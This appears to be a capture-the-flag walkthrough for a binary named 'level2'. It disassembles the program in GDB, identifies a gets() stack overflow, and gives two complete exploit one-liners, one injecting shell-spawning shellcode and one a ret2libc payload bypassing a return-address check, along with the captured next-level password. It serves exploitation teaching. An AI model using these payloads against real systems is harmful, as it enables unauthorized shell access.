## Clue for Exploration

In your journey through this challenge, take a closer look at how different functions within the program interact. Pay special attention to the way data is handled — particularly, spots where data might exceed its designated space. This could be a key area to explore. Think about the implications of overloading the program with data and how it might alter the program's intended path. Utilize debugging tools to observe these interactions and remember, every trial is a step towards understanding the puzzle. The true essence of solving lies in the process of experimenting and learning.

---

## Analyzing the Vulnerable Code

We start our journey by examining the binary's functions, focusing on the `main` and `p` functions. This is done using the GNU Debugger (GDB):

```bash
$ gdb ./level2
(gdb) info functions
All defined functions:
[...]
0x080484d4  p
0x0804853f  main
[...]
```

Disassembling these functions provides us with insights into their assembly-level operations:

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
End of assembler dump.
```

**Key Observations:**
- The `main` function's sole purpose is to call `p`.
- In `p`, we notice the use of `gets`, a function infamous for allowing buffer overflows due to its lack of input size checking.

---

# Buffer Overflow Exploit

## Identifying the Vulnerability

The primary vulnerability here lies in the use of `gets` within `p`. This function writes input to a buffer without checking its size, enabling us to overflow the buffer and overwrite adjacent memory areas.

## Crafting the Exploit

### Finding the Shellcode

We opt for a shellcode designed to spawn a shell. This shellcode, taken from the [Exploit Database](https://www.exploit-db.com/exploits/41757), is compact and effective for our purpose:

`\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

### Determining the Buffer Overflow Point

To find out at which point the buffer overflows, we use a [pattern generator tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/). It helps us to determine that the overflow occurs at an offset of `80` bytes. This was verified using GDB:

```bash
(gdb) run
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

### Finding the Return Address

To redirect the execution after the buffer overflow, we need the return address. We use `ltrace` to find that `strdup` returns to `0x0804a008`.

```bash
$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                              = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                   = 0xbffff6fc
puts(""
)                                                                                        = 1
strdup("")                                                                                      = 0x0804a008
+++ exited (status 8) +++
```

## Executing the Exploit

We construct and execute the exploit as follows:

```bash
$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "0"*(80-21) + "\x08\xa0\x04\x08")' && cat) | ./level2
j
 X�Rh//shh/bin��1�̀00000000000000000000000000000000000000000000000000000�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

This line of code carefully crafts a payload that injects the shellcode into the memory and overwrites the return address to execute our shellcode.

---

# Ret2Libc Exploit Walkthrough

Ret2Libc (Return-to-Libc) is an alternative exploit technique that doesn't require injecting shellcode but instead redirects the program flow to execute existing library functions.

## Finding System and /bin/sh Addresses

We need the addresses of the `system` function and the string `/bin/sh` in memory. These are found using GDB:

```bash
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
(gdb) info proc mappings
[...]
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
[...]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

## Bypassing the Comparison Check

In `p`, there's a `cmp` instruction that compares a value with `0xb0000000`, preventing a straightforward call to `system`. We circumvent this by setting up our payload to return to the next instruction after the comparison.

## Crafting the Ret2Libc Exploit

The structure of our payload is critical. It's designed as `system - return address - /bin/sh`:

```bash
$ (python -c 'print("0"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "SHIT" + "\x58\xcc\xf8\xb7")' && cat) | ./level2
0000000000000000000000000000000000000000000000000000000000000000>000000000000>`��SHITX���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Executing this command crafts a payload that overflows the buffer, bypasses the comparison check, and then uses the program's own code to spawn a shell.
